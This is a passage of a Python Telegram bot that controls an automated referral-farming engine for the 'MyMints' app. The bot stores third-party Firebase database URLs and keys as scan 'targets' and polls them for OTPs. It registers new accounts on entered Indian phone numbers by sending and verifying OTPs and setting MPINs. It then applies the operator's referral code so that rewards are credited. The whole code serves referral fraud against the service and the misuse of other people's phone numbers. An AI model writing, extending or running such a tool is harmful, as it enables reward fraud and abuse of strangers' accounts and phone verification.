        line = line.strip()
        if not line:
            continue

        matches = FB_URL_REGEX.findall(line)
        for url in matches:
            clean_url = url.split("?")[0].rstrip("/")
            # Check if optional auth key exists after pipe '|'
            key = ""
            if "|" in line:
                parts = line.split("|", 1)
                if len(parts) > 1:
                    key = parts[1].strip()
            elif "auth=" in url:
                m_auth = re.search(r"[?&]auth=([^&\s]+)", url)
                if m_auth:
                    key = m_auth.group(1).strip()

            results.append({"url": clean_url, "key": key})

    return results


# ─── TELEGRAM BOT HANDLERS ──────────────────────────────────
@bot.message_handler(commands=["start", "menu"])
def cmd_start(message: types.Message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or message.from_user.username or "User"
    terminal_log(f"[BOT] Received /start from {user_name} (ID: {user_id})")
    if not is_admin(user_id):
        c = load_config()
        terminal_log(f"[BOT] Unauthorized user ID: {user_id} (Config Admin ID: {c.get('admin_id')})")
        bot.reply_to(message, "⛔ Access Denied! Ye private bot hai.")
        return

    user_states.pop(message.chat.id, None)
    live_watchers.pop(message.chat.id, None)
    c = load_config()
    ref = c.get("referral_code") or "⚠️ Set Nahi Hai"
    fb_count = len(c.get("firebases", []))
    status_text = "🟢 RUNNING" if engine.is_running else "🔴 STOPPED"

    msg = (
        "🤖 <b>MyMints Telegram Control Center</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔹 <b>Engine Status:</b> {status_text}\n"
        f"🔹 <b>Referral Code:</b> <code>{html.escape(ref)}</code>\n"
        f"🔹 <b>Total Firebases:</b> <code>{fb_count}</code>\n"
        f"🔹 <b>Workers:</b> <code>{c.get('parallel_workers', 6)}</code> | <b>OTP Poll:</b> <code>{c.get('otp_timeout', 30)}s</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Neeche buttons se koi bhi action select karein:"
    )
    try:
        bot.send_message(message.chat.id, msg, reply_markup=get_main_menu_markup(), parse_mode="HTML")
    except Exception as e:
        terminal_log(f"[BOT ERROR] cmd_start send failed: {e}")
        bot.send_message(message.chat.id, msg, reply_markup=get_main_menu_markup())


@bot.message_handler(commands=["status"])
def cmd_status(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    send_or_update_live_status(message.chat.id)


@bot.message_handler(commands=["stop"])
def cmd_stop(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    if engine.is_running:
        engine.stop()
        bot.send_message(message.chat.id, "⏹️ <b>Auto Refer Rok Diya Gaya Hai!</b>", reply_markup=get_main_menu_markup())
    else:
        bot.send_message(message.chat.id, "ℹ️ Auto Refer abhi nahi chal raha tha.", reply_markup=get_main_menu_markup())


@bot.message_handler(commands=["manual"])
def cmd_manual(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    start_manual_refer_prompt(message.chat.id)


@bot.message_handler(commands=["add_fb"])
def cmd_add_fb(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    start_add_fb_prompt(message.chat.id)


@bot.message_handler(commands=["manage_fb"])
def cmd_manage_fb(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    show_manage_fb_menu(message.chat.id, page=0)


@bot.message_handler(commands=["del_fb", "delfb", "delete_firebase"])
def cmd_del_fb(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.strip().split()
    if len(parts) < 2 or not parts[1].isdigit():
        bot.reply_to(
            message,
            "ℹ️ <b>Format:</b> <code>/del_fb &lt;number&gt;</code>\nExample: <code>/del_fb 1</code>\n\nSabhi Firebases dekhne ke liye <code>/manage_fb</code> type karein.",
            parse_mode="HTML",
        )
        return
    num = int(parts[1])
    idx = num - 1
    c = load_config()
    fbs = c.get("firebases", [])
    if not isinstance(fbs, list):
        fbs = []
    if 0 <= idx < len(fbs):
        removed = fbs.pop(idx)
        save_config({"firebases": fbs})
        removed_url = removed.get("url", "") if isinstance(removed, dict) else str(removed)
        if engine.is_running:
            with engine._engine_lock:
                engine.pending_fbs = [
                    fb for fb in engine.pending_fbs
                    if (fb.get("url", "") if isinstance(fb, dict) else str(fb)) != removed_url
                ]
        bot.reply_to(
            message,
            f"✅ <b>Firebase Deleted!</b>\n#{num}: <code>{html.escape(removed_url)}</code>\n\nRemaining Active Firebases: <b>{len(fbs)}</b>",
            parse_mode="HTML",
        )
    else:
        bot.reply_to(message, f"❌ Number #{num} nahi mila! Total firebases: {len(fbs)}", parse_mode="HTML")


# ─── CALLBACK QUERY DISPATCHER ──────────────────────────────
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call: types.CallbackQuery):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "Access Denied!", show_alert=True)
        return

    chat_id = call.message.chat.id
    data = call.data
    try:

        if data == "goto_main_menu":
            user_states.pop(chat_id, None)
            live_watchers.pop(chat_id, None)
            c = load_config()
            ref = c.get("referral_code") or "⚠️ Set Nahi Hai"
            fb_count = len(c.get("firebases", []))
            status_text = "🟢 RUNNING" if engine.is_running else "🔴 STOPPED"

            msg = (
                "🤖 <b>MyMints Telegram Control Center</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔹 <b>Engine Status:</b> {status_text}\n"
                f"🔹 <b>Referral Code:</b> <code>{html.escape(ref)}</code>\n"
                f"🔹 <b>Total Firebases:</b> <code>{fb_count}</code>\n"
                f"🔹 <b>Workers:</b> <code>{c.get('parallel_workers', 6)}</code> | <b>OTP Poll:</b> <code>{c.get('otp_timeout', 30)}s</code>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "Neeche buttons se koi bhi action select karein:"
            )
            try:
                bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=get_main_menu_markup())
            except Exception:
                bot.send_message(chat_id, msg, reply_markup=get_main_menu_markup())
            bot.answer_callback_query(call.id)

        elif data == "btn_start_refer":
            c = load_config()
            ref = c.get("referral_code", "")
            fbs = c.get("firebases", [])
            workers = c.get("parallel_workers", 6)
            timeout = c.get("otp_timeout", 30)

            if not ref:
                live_watchers.pop(chat_id, None)
                bot.answer_callback_query(call.id, "⚠️ Referral code set nahi hai!", show_alert=True)
                user_states[chat_id] = {"action": "WAITING_REFERRAL_CODE"}
                msg = (
                    "⚙️ <b>Pehle Referral Code Set Karein</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "Auto refer start karne ke liye referral code zaroori hai.\n"
                    "Apna valid MyMints referral code type karke bhejein:"
                )
                try:
                    bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=get_back_markup("main_menu"), parse_mode="HTML")
                except Exception:
                    bot.send_message(chat_id, msg, reply_markup=get_back_markup("main_menu"), parse_mode="HTML")
                return

            if not fbs:
                bot.answer_callback_query(call.id, "⚠️ Kam se kam 1 Firebase add karein!", show_alert=True)
                start_add_fb_prompt(chat_id, call.message.message_id)
                return

            ok, reason = engine.start(fbs, ref, workers, timeout)
            bot.answer_callback_query(call.id, reason, show_alert=not ok)
            if ok:
                send_or_update_live_status(chat_id, call.message.message_id)

        elif data == "btn_stop_refer":
            if engine.is_running:
                engine.stop()
                bot.answer_callback_query(call.id, "Auto-refer roka ja raha hai...", show_alert=False)
                bot.send_message(chat_id, "⏹️ <b>Auto Refer Rok Diya Gaya!</b>", reply_markup=get_main_menu_markup())
            else:
                bot.answer_callback_query(call.id, "Auto-refer abhi nahi chal raha hai.", show_alert=True)

        elif data == "btn_live_status" or data == "btn_refresh_status":
            bot.answer_callback_query(call.id, "Status refreshed!")
            send_or_update_live_status(chat_id, call.message.message_id)

        elif data == "btn_set_ref":
            live_watchers.pop(chat_id, None)
            user_states[chat_id] = {"action": "WAITING_REFERRAL_CODE"}
            msg = (
                "⚙️ <b>Naya Referral Code Set Karein</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "Apna valid MyMints referral code type karke bhejein.\n"
                "<i>(Ye code permanently save ho jayega aur baar-baar nahi poocha jayega)</i>"
            )
            bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=get_back_markup("main_menu"))
            bot.answer_callback_query(call.id)

        elif data == "btn_add_fb":
            start_add_fb_prompt(chat_id, call.message.message_id)
            bot.answer_callback_query(call.id)

        elif data == "btn_manage_fb":
            try:
                bot.answer_callback_query(call.id)
            except Exception:
                pass
            show_manage_fb_menu(chat_id, call.message.message_id, page=0)

        elif data.startswith("fb_page_"):
            try:
                bot.answer_callback_query(call.id)
            except Exception:
                pass
            target_page = int(data.replace("fb_page_", ""))
            show_manage_fb_menu(chat_id, call.message.message_id, page=target_page)

        elif data == "noop":
            try:
                bot.answer_callback_query(call.id)
            except Exception:
                pass

        elif data.startswith("del_fb_"):
            # Format: del_fb_{idx}_{page} or legacy del_fb_{idx}
            parts = data.split("_")
            idx = int(parts[2])
            page = int(parts[3]) if len(parts) > 3 else 0

            c = load_config()
            fbs = c.get("firebases", [])
            if not isinstance(fbs, list):
                fbs = []

            if 0 <= idx < len(fbs):
                removed = fbs.pop(idx)
                save_config({"firebases": fbs})
                removed_url = removed.get("url", "") if isinstance(removed, dict) else str(removed)
                if engine.is_running:
                    with engine._engine_lock:
                        engine.pending_fbs = [
                            fb for fb in engine.pending_fbs
                            if (fb.get("url", "") if isinstance(fb, dict) else str(fb)) != removed_url
                        ]
                try:
                    bot.answer_callback_query(call.id, f"✅ #{idx+1} deleted!", show_alert=False)
                except Exception:
                    pass
            else:
                try:
                    bot.answer_callback_query(call.id, "Firebase pehle hi remove ho chuka hai!", show_alert=True)
                except Exception:
                    pass

            new_total_pages = max(1, math.ceil(len(fbs) / FB_PAGE_SIZE)) if fbs else 1
            if page >= new_total_pages:
                page = max(0, new_total_pages - 1)
            show_manage_fb_menu(chat_id, call.message.message_id, page=page)

        elif data == "confirm_clear_fbs":
            confirm_markup = types.InlineKeyboardMarkup(row_width=2)
            confirm_markup.row(
                types.InlineKeyboardButton("⚠️ Haan, Saare Delete Karein", callback_data="clear_all_fbs"),
                types.InlineKeyboardButton("❌ Cancel", callback_data="btn_manage_fb"),
            )
            msg = "⚠️ <b>Kya aap sach mein saare Firebase URLs delete karna chahte hain?</b>\nYe action undo nahi ho sakta."
            try:
                bot.answer_callback_query(call.id)
                bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=confirm_markup, parse_mode="HTML")
            except Exception:
                bot.send_message(chat_id, msg, reply_markup=confirm_markup, parse_mode="HTML")

        elif data == "clear_all_fbs":
            save_config({"firebases": []})
            if engine.is_running:
                with engine._engine_lock:
                    engine.pending_fbs = []
            try:
                bot.answer_callback_query(call.id, "✅ Saare Firebases Clear Kar Diye Gaye!", show_alert=True)
            except Exception:
                pass
            show_manage_fb_menu(chat_id, call.message.message_id, page=0)

        elif data == "btn_manual_refer":
            start_manual_refer_prompt(chat_id, call.message.message_id)
            bot.answer_callback_query(call.id)

        elif data == "btn_settings":
            live_watchers.pop(chat_id, None)
            user_states[chat_id] = {"action": "WAITING_WORKERS"}
            c = load_config()
            msg = (
                "⚡ <b>Configure Parallel Workers</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Current Workers: <code>{c.get('parallel_workers', 6)}</code> (Minimum: 4)\n\n"
                "Naya worker count type karke bhejein:"
            )
            bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=get_back_markup("main_menu"))
            bot.answer_callback_query(call.id)


    except Exception as e:
        print(f"[CALLBACK DISPATCH ERROR] {e}")
        try:
            bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}", show_alert=True)
        except Exception:
            pass


# ─── MENU HELPERS ───────────────────────────────────────────
def start_add_fb_prompt(chat_id: int, message_id: Optional[int] = None):
    live_watchers.pop(chat_id, None)
    user_states[chat_id] = {"action": "WAITING_FIREBASE_INPUT"}
    msg = (
        "➕ <b>Add Firebase URLs</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Aap 3 tarike se Firebase add kar sakte hain:\n"
        "1. <b>Single Link:</b> Message me bhejein\n"
        "2. <b>Bulk Links:</b> Ek sath multiple links paste karein\n"
        "3. <b>.txt File:</b> File upload karein, bot khud extract kar lega\n\n"
        "<i>Donon formats supported:</i>\n"
        "• <code>https://xxx.firebaseio.com | key</code>\n"
        "• <code>https://xxx.firebasedatabase.app | key</code>\n"
        "<i>(Optional auth key ke sath ya bina key ke)</i>"
    )
    if message_id:
        try:
            bot.edit_message_text(msg, chat_id, message_id, reply_markup=get_back_markup("main_menu"))
            return
        except Exception:
            pass
    bot.send_message(chat_id, msg, reply_markup=get_back_markup("main_menu"))


FB_PAGE_SIZE = 5


def show_manage_fb_menu(chat_id: int, message_id: Optional[int] = None, page: int = 0):
    live_watchers.pop(chat_id, None)
    c = load_config()
    fbs = c.get("firebases", [])
    if not isinstance(fbs, list):
        fbs = []

    markup = types.InlineKeyboardMarkup(row_width=2)

    if not fbs:
        msg = (
            "📁 <b>Manage Firebases</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "<i>Abhi tak koi Firebase URL add nahi kiya gaya hai.</i>\n\n"
            "Naya Firebase add karne ke liye <b>➕ Add Firebase</b> dabayein."
        )
        markup.add(types.InlineKeyboardButton("➕ Add Firebase", callback_data="btn_add_fb"))
        markup.add(types.InlineKeyboardButton("🔙 Main Menu", callback_data="goto_main_menu"))
    else:
        total_items = len(fbs)
        total_pages = max(1, math.ceil(total_items / FB_PAGE_SIZE))
        page = max(0, min(page, total_pages - 1))

        start_idx = page * FB_PAGE_SIZE
        end_idx = min(start_idx + FB_PAGE_SIZE, total_items)
        current_page_fbs = fbs[start_idx:end_idx]

        text_lines = [
            f"📁 <b>Saved Firebases List</b> (Page {page + 1}/{total_pages})",
            "━━━━━━━━━━━━━━━━━━━━━━"
        ]

        del_buttons = []
        for offset, fb in enumerate(current_page_fbs):
            idx = start_idx + offset
            if isinstance(fb, dict):
                url_str = fb.get("url", "")
                key_str = fb.get("key", "")
            else:
                url_str = str(fb)
                key_str = ""

            key_tag = f" 🔑 <i>(Key: {html.escape(key_str[:6])}...)</i>" if key_str else ""
            text_lines.append(f"<b>#{idx+1}:</b> <code>{html.escape(url_str)}</code>{key_tag}")
            del_buttons.append(types.InlineKeyboardButton(f"❌ Del #{idx+1}", callback_data=f"del_fb_{idx}_{page}"))

        text_lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        text_lines.append(f"Total Active: <b>{total_items}</b>")
        text_lines.append("<i>Neeche diye gaye Del button se kisi bhi Firebase ko delete karein:</i>")
        msg = "\n".join(text_lines)

        # Add delete buttons in pairs of 2
        for i in range(0, len(del_buttons), 2):
            markup.row(*del_buttons[i : i + 2])

        # Pagination row if multiple pages
        if total_pages > 1:
            nav_row = []
            if page > 0:
                nav_row.append(types.InlineKeyboardButton("◀️ Prev", callback_data=f"fb_page_{page - 1}"))
            else:
                nav_row.append(types.InlineKeyboardButton("⏹️", callback_data="noop"))

            nav_row.append(types.InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))

            if page < total_pages - 1:
                nav_row.append(types.InlineKeyboardButton("Next ▶️", callback_data=f"fb_page_{page + 1}"))
            else:
                nav_row.append(types.InlineKeyboardButton("⏹️", callback_data="noop"))

            markup.row(*nav_row)

        markup.row(
            types.InlineKeyboardButton("🗑️ Clear All", callback_data="confirm_clear_fbs"),
            types.InlineKeyboardButton("➕ Add More", callback_data="btn_add_fb"),
        )
        markup.row(types.InlineKeyboardButton("🔙 Main Menu", callback_data="goto_main_menu"))

    if message_id:
        try:
            bot.edit_message_text(msg, chat_id, message_id, reply_markup=markup, parse_mode="HTML")
            return
        except ApiTelegramException as te:
            if "message is not modified" in str(te).lower():
                return
        except Exception:
            pass

    try:
        bot.send_message(chat_id, msg, reply_markup=markup, parse_mode="HTML")
    except Exception as e:
        print(f"[SHOW_MANAGE_FB ERROR] {e}")


def start_manual_refer_prompt(chat_id: int, message_id: Optional[int] = None):
    live_watchers.pop(chat_id, None)
    c = load_config()
    ref = c.get("referral_code", "")
    if not ref:
        bot.send_message(
            chat_id,
            "⚠️ <b>Pehle Referral Code Set Karein!</b>\nMain menu me jakar apna refer code save karein.",
            reply_markup=get_back_markup("main_menu"),
        )
        return

    user_states[chat_id] = {"action": "WAITING_MANUAL_PHONE"}
    msg = (
        "📱 <b>Manual 1-by-1 Refer Process</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Active Referral Code: <code>{ref}</code>\n\n"
        "👉 <b>10-digit Indian Mobile Number</b> type karke bhejein:\n"
        "<i>(Bot pehle check karega ki number eligible hai ya nahi, fir OTP bhejega)</i>"
    )
    if message_id:
        try:
            bot.edit_message_text(msg, chat_id, message_id, reply_markup=get_back_markup("main_menu"))
            return
        except Exception:
            pass
    bot.send_message(chat_id, msg, reply_markup=get_back_markup("main_menu"))


# ─── LIVE TERMINAL STATUS WITH 2-SEC AUTO REFRESH ───────────
def send_or_update_live_status(chat_id: int, message_id: Optional[int] = None):
    c = load_config()
    st = get_stats_copy()
    ref = c.get("referral_code") or "NOT SET"
    status_str = "🟢 RUNNING (Parallel Online)" if engine.is_running else "🔴 IDLE (Waiting for start)"
    workers = c.get("parallel_workers", 6)
    timeout = c.get("otp_timeout", 30)
    fb_count = len(c.get("firebases", []))
    logs = get_last_auto_scan_logs(count=5)

    text = (
        "📊 <b>LIVE AUTO-REFER STATUS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔹 <b>Engine State:</b> {status_str}\n"
        f"🔹 <b>Referral Code:</b> <code>{html.escape(ref)}</code>\n"
        f"🔹 <b>Firebases Loaded:</b> <code>{fb_count}</code>\n"
        f"🔹 <b>Active Targets Found:</b> <code>{engine.active_targets_count}</code>\n"
        f"🔹 <b>Stats:</b> ✅ {st['success']} Success | ⏭️ {st['skip']} Skipped | ❌ {st['fail']} Failed\n"
        f"🔹 <b>Workers:</b> <code>{workers}</code> | <b>OTP Poll:</b> <code>{timeout}s</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📟 <b>AUTO-SCAN TERMINAL LOGS (LAST 5):</b>\n"
        f"<pre>{html.escape(logs)}</pre>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "<i>🔄 Auto-refreshing har 2 second me...</i>"
    )

    markup = get_status_markup()

    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
            live_watchers[chat_id] = message_id
            return
        except ApiTelegramException as e:
            if "message is not modified" in str(e):
                live_watchers[chat_id] = message_id
                return
            pass

    sent = bot.send_message(chat_id, text, reply_markup=markup)
    live_watchers[chat_id] = sent.message_id


def background_status_updater():
    """Background daemon thread to auto-refresh live status messages every 2 seconds"""
    while True:
        try:
            sleep_time = 2.0 if engine.is_running else 6.0
            time.sleep(sleep_time)
            if not live_watchers:
                continue

            for chat_id, msg_id in list(live_watchers.items()):
                c = load_config()
                st = get_stats_copy()
                ref = c.get("referral_code") or "NOT SET"
                status_str = "🟢 RUNNING" if engine.is_running else "🔴 IDLE"
                workers = c.get("parallel_workers", 6)
                timeout = c.get("otp_timeout", 30)
                fb_count = len(c.get("firebases", []))
                logs = get_last_auto_scan_logs(count=5)

                text = (
                    "📊 <b>LIVE AUTO-REFER STATUS</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🔹 <b>Engine State:</b> {status_str}\n"
                    f"🔹 <b>Referral Code:</b> <code>{html.escape(ref)}</code>\n"
                    f"🔹 <b>Firebases Loaded:</b> <code>{fb_count}</code>\n"
                    f"🔹 <b>Active Targets Found:</b> <code>{engine.active_targets_count}</code>\n"
                    f"🔹 <b>Stats:</b> ✅ {st['success']} Success | ⏭️ {st['skip']} Skipped | ❌ {st['fail']} Failed\n"
                    f"🔹 <b>Workers:</b> <code>{workers}</code> | <b>OTP Poll:</b> <code>{timeout}s</code>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "📟 <b>AUTO-SCAN TERMINAL LOGS (LAST 5):</b>\n"
                    f"<pre>{html.escape(logs)}</pre>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "<i>🔄 Auto-refreshing har 2 second me...</i>"
                )

                try:
                    bot.edit_message_text(text, chat_id, msg_id, reply_markup=get_status_markup())
                except ApiTelegramException as e:
                    if "message is not modified" in str(e):
                        continue
                    if "retry after" in str(e).lower() or getattr(e, "error_code", None) == 429:
                        time.sleep(5)
                        continue
                    if "message to edit not found" in str(e) or "bot was blocked" in str(e) or "chat not found" in str(e):
                        live_watchers.pop(chat_id, None)
                except Exception:
                    pass

        except Exception:
            time.sleep(2.0)


# Start the background live updater
threading.Thread(target=background_status_updater, daemon=True).start()


# ─── INCOMING TEXT & DOCUMENT MESSAGE HANDLER ───────────────
@bot.message_handler(content_types=["text", "document"])
def handle_text_and_docs(message: types.Message):
    if not is_admin(message.from_user.id):
        return

    chat_id = message.chat.id
    state_data = user_states.get(chat_id, {})
    action = state_data.get("action")

    # 1. Document Upload (for .txt file Firebase extraction)
    if message.content_type == "document":
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            content = downloaded.decode("utf-8", errors="ignore")
            extracted = extract_firebases_from_text(content)

            if not extracted:
                bot.reply_to(
                    message,
                    "❌ File me koi valid Firebase link nahi mila!\n(firebaseio.com ya firebasedatabase.app)",
                    reply_markup=get_back_markup("main_menu"),
                )
                return

            c = load_config()
            existing = {fb["url"]: fb for fb in c.get("firebases", [])}
            added = 0
            for item in extracted:
                if item["url"] not in existing:
                    existing[item["url"]] = item
                    added += 1

            new_list = list(existing.values())
            save_config({"firebases": new_list})

            # Dynamic Queue: if auto-refer is running, inject right now!
            if engine.is_running:
                engine.add_more_fbs_to_queue(extracted)

            user_states.pop(chat_id, None)
            bot.reply_to(
                message,
                f"✅ <b>File Processed!</b>\n\nTotal Extracted: <code>{len(extracted)}</code>\nNew Added: <code>{added}</code>\nTotal Active Firebases: <code>{len(new_list)}</code>"
                + ("\n<i>⚡ Dynamic Queue me add ho gaya hai!</i>" if engine.is_running else ""),
                reply_markup=get_main_menu_markup(),
            )
            return
        except Exception as e:
            bot.reply_to(message, f"❌ File reading error: {html.escape(str(e))}", reply_markup=get_back_markup("main_menu"))
            return

    text = (message.text or "").strip()

    # 2. Setting Referral Code
    if action == "WAITING_REFERRAL_CODE":
        code = text.upper()
        bot.send_chat_action(chat_id, "typing")
        if validate_referral(code):
            save_config({"referral_code": code})
            user_states.pop(chat_id, None)
            confirm_markup = types.InlineKeyboardMarkup(row_width=2)
            confirm_markup.row(
                types.InlineKeyboardButton("▶️ Start Refer", callback_data="btn_start_refer"),
                types.InlineKeyboardButton("🏠 Main Menu", callback_data="goto_main_menu"),
            )
            bot.reply_to(
                message,
                f"✅ <b>Referral Code Saved Successfully!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔹 <b>Code:</b> <code>{html.escape(code)}</code>\n"
                f"🔹 <b>Status:</b> Permanent Save Complete ✓\n\n"
                f"Ab aap neeche diye button se <b>Start Refer</b> kar sakte hain ya Main Menu me ja sakte hain.",
                reply_markup=confirm_markup,
                parse_mode="HTML",
            )
        else:
            bot.reply_to(
                message,
                f"❌ <b>Invalid Referral Code:</b> <code>{html.escape(code)}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"MyMints API par ye referral code exist nahi karta.\n"
                f"Kripya sahi code check karke dobara bhejein:",
                reply_markup=get_back_markup("main_menu"),
                parse_mode="HTML",
            )
        return

    # 3. Adding Firebase via Text (Single or Bulk)
    if action == "WAITING_FIREBASE_INPUT":
        extracted = extract_firebases_from_text(text)
        if not extracted:
            bot.reply_to(
                message,
                "❌ Koi valid Firebase URL nahi mila!\nKripya URL bhejein jaise:\n<code>https://xxx.firebaseio.com</code>\nya <code>https://xxx.firebasedatabase.app</code>",
                reply_markup=get_back_markup("main_menu"),
            )
            return

        c = load_config()
        existing = {fb["url"]: fb for fb in c.get("firebases", [])}
        added = 0
        for item in extracted:
            if item["url"] not in existing:
                existing[item["url"]] = item
                added += 1

        new_list = list(existing.values())
        save_config({"firebases": new_list})

        # Dynamic Queue: If running, inject immediately!
        if engine.is_running:
            engine.add_more_fbs_to_queue(extracted)

        user_states.pop(chat_id, None)
        bot.reply_to(
            message,
            f"✅ <b>Firebase Added!</b>\nNew Added: <code>{added}</code>\nTotal Active: <code>{len(new_list)}</code>"
            + ("\n<i>⚡ Naye links live running queue me jud gaye!</i>" if engine.is_running else ""),
            reply_markup=get_main_menu_markup(),
        )
        return

    # 4. Setting Workers
    if action == "WAITING_WORKERS":
        if text.isdigit() and int(text) >= MIN_PARALLEL_WORKERS:
            w = int(text)
            save_config({"parallel_workers": w})
            user_states.pop(chat_id, None)
            bot.reply_to(message, f"✅ Workers set to: <code>{w}</code>", reply_markup=get_main_menu_markup())
        else:
            bot.reply_to(message, f"❌ Sahi number daalein (Minimum {MIN_PARALLEL_WORKERS}):", reply_markup=get_back_markup("main_menu"))
        return

    # 5. Manual Refer Step 1: Phone input & Eligibility Check
    if action == "WAITING_MANUAL_PHONE":
        cleaned = _clean_num(text)
        if not cleaned:
            bot.reply_to(
                message,
                "❌ <b>Invalid Indian Mobile Number!</b>\n10-digit number bhejein (e.g. <code>9876543210</code>):",
                reply_markup=get_back_markup("main_menu"),
            )
            return

        bot.send_chat_action(chat_id, "typing")
        terminal_log(f"[MANUAL] Starting eligibility check for: {cleaned}")

        # Send OTP
        ok, res_data = send_otp_api(cleaned)
        if not ok:
            err_msg = res_data.get("message") or "OTP send fail ho gaya"
            bot.reply_to(
                message,
                f"❌ <b>OTP Send Failed:</b> {html.escape(str(err_msg))}\nNumber: <code>{cleaned}</code>",
                reply_markup=get_main_menu_markup(),
            )
            user_states.pop(chat_id, None)
            return

        # Check if response indicated old user
        data_obj = res_data.get("data") or {}
        if data_obj.get("is_new") is False:
            bot.reply_to(
                message,
                f"⚠️ <b>Number Already Registered Hai!</b>\nNumber <code>{cleaned}</code> new account nahi hai, isliye referral apply nahi hoga.",
                reply_markup=get_main_menu_markup(),
            )
            user_states.pop(chat_id, None)
            return

        # Advance state to waiting OTP
        user_states[chat_id] = {
            "action": "WAITING_MANUAL_OTP",
            "phone": cleaned,
        }
        bot.reply_to(
            message,
            f"✅ <b>OTP Sent Successfully!</b>\nNumber: <code>{cleaned}</code>\n\nAb mobile par aaya hua <b>6-digit OTP</b> type karke bhejein:",
            reply_markup=get_back_markup("main_menu"),
        )
        return

    # 6. Manual Refer Step 2: OTP verify -> MPIN -> Apply Refer
    if action == "WAITING_MANUAL_OTP":
        otp = re.sub(r"\D", "", text)
        phone = state_data.get("phone", "")
        if not otp or len(otp) != 6:
            bot.reply_to(message, "❌ Kripya valid 6-digit numeric OTP bhejein:", reply_markup=get_back_markup("main_menu"))
            return

        c = load_config()
        ref_code = c.get("referral_code", "")
        bot.send_chat_action(chat_id, "typing")
        bot.send_message(chat_id, f"⏳ OTP verify kiya ja raha hai for <code>{phone}</code>...")

        token, mpin_token, is_new = verify_otp_api(phone, otp)
        if not token and not mpin_token:
            bot.send_message(
                chat_id,
                "❌ <b>OTP Verification Failed!</b>\nOTP galat hai ya expire ho chuka hai.",
                reply_markup=get_main_menu_markup(),
            )
            user_states.pop(chat_id, None)
            return

        if not is_new:
            bot.send_message(
                chat_id,
                f"⚠️ <b>Account Pehle Se Bna Hua Hai!</b>\nNumber <code>{phone}</code> new account nahi hai, isliye referral apply nahi ho sakta.",
                reply_markup=get_main_menu_markup(),
            )
            user_states.pop(chat_id, None)
            return

        if mpin_token:
            new_tok = set_mpin_api(mpin_token)
            if new_tok:
                token = new_tok
            time.sleep(0.3)

        if not token:
            bot.send_message(
                chat_id,
                "❌ <b>Token Error:</b> Auth token generate nahi hua.",
                reply_markup=get_main_menu_markup(),
            )
            user_states.pop(chat_id, None)
            return

        res = apply_referral_api(token, ref_code)
        user_states.pop(chat_id, None)

        if res == "success":
            bot.send_message(
                chat_id,
                f"🎉 <b>REFERRAL SUCCESSFUL!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📱 Number: <code>{phone}</code>\n🎁 Refer Code: <code>{ref_code}</code>\n✅ Points/Rewards account me credit ho gaye!",
                reply_markup=get_main_menu_markup(),
            )
        elif res == "already":
            bot.send_message(
                chat_id,
                "⚠️ <b>Already Applied:</b> Is account par referral code pehle se laga hua hai.",
                reply_markup=get_main_menu_markup(),
            )
        else:
            bot.send_message(
                chat_id,
                "❌ <b>Referral Apply Failed:</b> Server ne referral accept nahi kiya.",
                reply_markup=get_main_menu_markup(),
            )
        return

    # Fallback response for unhandled text
    bot.reply_to(
        message,
        "ℹ️ Kripya menu ke buttons ka use karein ya /start bhejein.",
        reply_markup=get_main_menu_markup(),
    )


# ─── ENTRY POINT ────────────────────────────────────────────
def main():
    print("=" * 60)
    print("  MyMints Telegram Automation Bot Engine")
    print("=" * 60)

    cfg = load_config()
    token = os.environ.get("BOT_TOKEN", "").strip() or cfg.get("bot_token", "").strip()

    if not token or token == "YOUR_BOT_TOKEN_HERE":
        print("\n[!] ATTENTION: Telegram Bot Token Configure Nahi Hai!")
        print(f"[!] Kripya '{CONFIG_FILE}' open karein aur apna BotFather token daalein.")
        user_tok = input("\nYa fir abhi apna Telegram Bot Token paste karein: ").strip()
        if user_tok:
            save_config({"bot_token": user_tok})
            token = user_tok
        else:
            sys.exit(1)

    # Set bot token on the existing instance so all registered handlers are preserved!
    bot.token = token

    # Set Three-Line Menu Commands in Telegram
    try:
        bot.set_my_commands([
            types.BotCommand("start", "🏠 Main Control Menu"),
            types.BotCommand("status", "📊 Live Status & Terminal Logs"),
            types.BotCommand("manual", "📱 Manual Refer (1-by-1)"),
            types.BotCommand("add_fb", "➕ Add Firebase URLs"),
            types.BotCommand("manage_fb", "📁 Manage Saved Firebases"),
